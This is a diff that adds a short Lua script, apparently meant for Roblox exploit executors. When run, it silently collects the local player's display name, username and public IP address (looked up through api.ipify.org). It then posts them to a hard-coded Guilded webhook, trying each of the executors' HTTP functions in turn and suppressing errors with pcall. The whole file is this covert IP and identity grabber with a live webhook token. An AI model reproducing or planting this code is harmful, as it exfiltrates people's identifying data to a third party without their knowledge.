@@ -1,0 +1,47 @@
+local webh = "https://media.guilded.gg/webhooks/1f16de3f-c68f-418d-b981-e9be24e88731/dnPWU0r5ok28saCM08Ac4IwUcK8A8UO2AScSyOqsOiAAquuYg68wacGaskoQsY2WemmCkYQUweMuu8ssQaW802"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = "Execution \n Display "..game.Players.LocalPlayer.DisplayName.."\n User "..game.Players.LocalPlayer.Name,
+               ["description"] = "IP Adress: " ..game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
